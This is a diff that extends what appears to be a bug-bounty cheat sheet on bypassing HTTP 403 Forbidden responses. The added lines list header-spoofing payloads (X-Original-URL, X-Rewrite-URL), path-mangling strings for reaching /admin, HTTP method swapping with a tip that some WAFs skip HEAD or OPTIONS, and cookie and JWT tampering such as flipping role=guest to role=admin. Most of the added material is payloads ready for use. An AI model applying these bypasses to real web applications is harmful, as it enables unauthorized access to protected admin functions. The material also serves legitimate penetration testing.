@@ -207,6 +207,8 @@ Referer: https://target.com
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
 X-Forwarded-For: 127.0.0.1
 X-Custom-IP-Authorization
+X-Rewrite-URL: /admin
+X-Original-URL: /admin
 X-Forwarded-For
 X-Forward-For
 X-Remote-IP
@@ -245,6 +247,14 @@ http://example.com/secret/http://example.com/secret..;/http://example.com/secret
 
 String terminators (%00, 0x00, //, ;, %, !, ?, [] etc.) — adding those to the end of the path and inside the path
 
+/admin
+/admin/
+/admin/.
+/admin/..;/  
+/%2e/admin  
+/admin%2f  
+/admin;/
+
 
 some bypass to try :
 site.com/secret –> HTTP 403 Forbidden
@@ -264,6 +274,16 @@ site.com/secret.json –> HTTP 200 OK (ruby
 Technique #3: Method swapping
 ```bash
 ✔️ Always test multiple HTTP methods (GET, POST, OPTIONS, TRACE, PUT, HEAD).
+
+HEAD
+POST
+OPTIONS
+PUT
+DELETE
+PATCH
+
+Some WAFs don't even inspect HEAD or OPTIONS methods."
+Add headers like Content-Length: 0 and Content-Type: application/json to make POSTs seem legitimate.
 
 curl -X TRACE https://target.com/ -H “User-Agent: Custom”
 curl -X POST https://target.com/ -H "X-HTTP-Method-Override: DELETE" (spoof header)
@@ -288,6 +308,16 @@ curl http://example.com/secret.bak # directory brute force . directly file brute
 Technique #7: Switch Between HTTP and HTTPS
 ```bash
 http://example.com/secret/https://example.com/secret/
+```
+
+Technique #8:Cookie & Session Token Manipulation
+```bash
+Logging in and capturing cookies
+Modifying cookies (isAdmin=false → true)
+Inspecting JWTs (use JWT.io)
+Deleting optional cookies (secureFlag=true → deleted)
+
+Real bug: A company used role=guest in a session cookie. Changing it to role=admin bypassed the entire RBAC system. 💰 Payout: $3,000
 ```
 
 
